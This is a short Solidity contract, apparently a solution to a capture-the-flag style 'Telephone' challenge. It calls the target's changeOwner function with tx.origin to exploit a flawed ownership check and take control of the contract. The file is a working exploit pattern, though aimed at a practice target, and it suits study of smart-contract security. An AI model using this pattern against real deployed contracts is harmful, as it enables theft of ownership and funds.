// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Telephone.sol';

contract attackTelephone {
    Telephone tel;
    constructor(address _addy) public {
        tel = Telephone(_addy);
    }
    function attack() public {
        tel.changeOwner(tx.origin);
    }
    
}